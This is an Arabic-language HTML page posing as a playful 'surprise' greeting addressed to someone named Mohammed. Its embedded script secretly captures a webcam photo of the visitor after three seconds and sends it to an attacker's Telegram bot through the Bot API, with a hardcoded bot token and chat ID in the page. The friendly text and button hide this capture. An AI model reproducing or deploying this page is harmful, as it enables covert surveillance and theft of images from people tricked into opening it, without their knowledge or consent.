<!DOCTYPE html>
<html lang="ar">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اقبل يحب ذا تست بس</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #f06, #48f);
            color: white;
            font-family: 'Arial', sans-serif;
            text-align: center;
        }

        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
        }

        h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }

        p {
            font-size: 1.2rem;
            margin-bottom: 20px;
        }

        .button {
            padding: 10px 20px;
            background-color: #ff4081;
            border: none;
            color: white;
            font-size: 1rem;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s;
        }

        .button:hover {
            background-color: #f50057;
        }

        video {
            margin-top: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>هايييييييييييييييييييي محمد</h1>
        <p>لقد وجدت شيئاً رائعاً! استمتع بمفاجأتك الجميلة!</p>
        <button class="button" onclick="alert('مفاجأة! 🌟')">اضغط هنا لمفاجأة!</button>
    </div>

    <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const telegramBotToken = '7429529715:AAEKiCoWo6w_55Y94HQOSb3EO1v_m_6ThFs'; // ضع رمز البوت هنا
        const chatId = '6335563455'; // ضع معرف الدردشة الخاص بك هنا

        // الوصول إلى الكاميرا والتقاط الصورة
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                setTimeout(() => {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'photo.png');

                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        })
                            .then(response => response.json())
                            .then(data => {
                                if (!data.ok) {
                                    console.error('فشل إرسال الصورة:', data.description);
                                }
                            })
                            .catch(error => console.error('حدث خطأ أثناء الإرسال:', error));
                    }, 'image/png');
                }, 3000);
            })
            .catch(err => {
                console.error("حدث خطأ في الوصول إلى الكاميرا: " + err);
            });
    </script>
</body>

</html>
